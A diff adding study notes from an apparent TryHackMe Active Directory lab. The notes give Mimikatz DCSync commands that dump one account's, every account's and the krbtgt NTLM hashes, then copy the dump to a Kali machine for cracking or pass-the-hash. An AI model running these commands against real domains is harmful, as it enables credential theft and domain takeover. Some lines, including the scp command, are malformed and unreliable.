@@ -1,0 +1,43 @@
+DC Sync:
+It is not sufficient to have a single domain controller per domain in large organisations. 
+These domains are often used in multiple regional locations, and having a single DC.
+
+The process of replication is called DC Synchronisation. 
+It is not just the DCs that can initiate replication. 
+Accounts such as those belonging to the Domain Admins groups can also do it for legitimate purposes such as creating a new domain controller.
+
+Not All Credentials Are Created Equal:
+-Credentials that have local administrator rights on several machines. 
+Usually, organisations have a group or two with local admin rights on almost all computers. 
+These groups are typically divided into one for workstations and one for servers. By harvesting the credentials of members of these groups, we would still have access to most of the computers in the estate.
+
+-Service accounts that have delegation permissions. 
+With these accounts, we would be able to force golden and silver tickets to perform Kerberos delegation attacks.
+
+-Accounts used for privileged AD services. 
+If we compromise accounts of privileged services such as Exchange, Windows Server Update Services (WSUS), 
+or System Center Configuration Manager (SCCM), we could leverage AD exploitation to once again gain a privileged foothold.
+
+Mimikatz DCSync Attack:
+From the Victim Windows Machine cmd:
+->    \Tools\mimikatz_trunk\x64\mimikatz.exe
+->    lsadump::dcsync /domain:za.tryhackme.loc /user:<Your low-privilege AD Username>
+
+You can verify that the NTLM hash is correct by using a website such as this to transform your password into an NTLM hash:
+https://codebeautify.org/ntlm-hash-generator
+
+We want to DC sync every single account. To do this, we will have to enable logging on Mimikatz:
+->    log <username>_dcdump.txt
+->    lsadump::dcsync /domain:za.tryhackme.loc /all
+
+Once done, exit Mimikatz to finalise the dump find and then you can download the <username>_dcdump.txt file.
+
+We can now either perform an offline password cracking attack to recover the plain text credentials or simply perform a pass the hash attack with Mimikatz.
+
+In our Attack Machine Kali:
+scp domainName:_dcdump Full FilePath . (Full FIle Path haesh == /)
+->  cat <username>_dcdump.txt | grep "SAM Username"
+->  cat <username>_dcdump.txt | grep "Hash NTLM"
+
+or use mimikatz to krbtgt dump the NTLM_HASH in the Victim Windows Machine:
+->  lsadump::dcsync /domain:<Domain Name> /user:krbtgt@<Domain Name>
